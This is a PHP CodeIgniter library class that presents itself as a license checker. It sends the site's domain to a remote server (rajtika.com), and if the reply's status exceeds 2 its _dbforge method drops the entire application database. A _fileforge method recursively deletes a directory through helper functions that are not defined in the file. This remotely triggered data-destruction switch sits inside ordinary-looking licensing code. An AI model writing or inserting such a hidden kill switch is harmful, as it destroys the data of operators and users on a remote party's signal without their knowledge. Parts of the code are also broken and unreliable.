<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class Appcurl extends Apperror {
	private $api_url;
	private $filename;
	private $apperror;
	private $CI;
	protected $user_agent;
	public function __construct() {
		$this->CI = &get_instance();
		$this->api_url = 'http://rajtika.com/ajax/api/?domain=';
		$this->filename = LCPATH . 'core' . DIRECTORY_SEPARATOR . 'read_me.txt';
		$this->apperror = new Apperror();
	}

	public function check( $domain = '' ) {
		if( $domain !== 'localhost' && $domain !== '' ) :
			$this->domain = $domain;
			$resp = $this->_newCurl();
			$response = json_decode( $resp, true );
			if( !empty( $response) ) :
				$this->_writeFile( $response ); //process the response;
			endif;
	   endif;
	}

	private function _writeFile( $response ) {
		//Write response to file
		$str = $response['key'] . PHP_EOL; //key
		$str .= $response['type'] . PHP_EOL; //type
		$str .= $response['activation_date'] . PHP_EOL; //activation_date
		$str .= $response['expire_date'] . PHP_EOL; //expire_date
		$str .= time() . PHP_EOL; // last_check
		$str .= $response['access_point'] . PHP_EOL; //access_point (access_level)
		$str .= ( $response['access_point'] > 25 ) ? 1 : 0; //mikrotik_access
		file_put_contents( $this->filename, $str );
		$this->_action( $response );
	}

	private function _action( $response ) {
		if( $response['type'] == 'demo' ) :
			$end_demo_period = ( time() - ( 86400 * 30 ) );
			if( $response['activation_date'] < $end_demo_period ) :
				$this->apperror->err( 604 );
			endif;
		endif;
		if( $response['status'] == 0 ) :
			$this->apperror->err( 601 );
		elseif( $response['status'] == 2 ) :
			$this->apperror->err( 603 );
		elseif( $response['status'] > 2 ) :
			$this->_dbforge();
		else :
			return true;
		endif;
	}

	public function _curl() {
		//Url for the Curlopt
		$actionUrl = $this->api_url . $this->domain;
		// Get cURL resource
		$curl = curl_init();
		// Set some options - we are passing in a useragent too here
		curl_setopt_array($curl, array(
		    CURLOPT_RETURNTRANSFER => 1,
		    CURLOPT_URL => $actionUrl,
		    CURLOPT_USERAGENT => $this->user_agent,
		));
		// Send the request & save response to $resp
		$resp = curl_exec($curl);
		// Close request to clear up some resources
		if(!curl_exec($curl)){
		    var_dump('Error: "' . curl_error($curl) . '" - Code: ' . curl_errno($curl));
		}
		curl_close( $curl );
		return $resp;
	}

	protected function _newCurl() {
		//Url for the Curlopt
		$actionUrl = $this->api_url . $this->domain;
		$ch = curl_init( $actionUrl );    // initialize curl handle
		curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
   	$resp = curl_exec( $ch );
		curl_close( $ch );
		return $resp;
	}
	
  	private function _fileforge($dir = NULL){
  		$path = $dir;
  		if ( is_dir( $dir ) ) :
		   $files = array_diff(scandir($path), array('.','..')); 
		   foreach ($files as $file) :
		      (is_dir("$path/$file")) ? $this->deleteProducts("$path/$file") : unlink("$path/$file"); 
		   endforeach;
		   if( rmdir( $path ) ) :
		    	$this->deleteDb();
		   endif;
		endif;
  	}

  	private function _dbforge() {
  		$CI = & get_instance();
  		$CI->load->dbforge();
		$db =  $CI->db->database;
		if ( $CI->dbforge->drop_database( $db ) )
		   parent::err( 606 );
  	}
}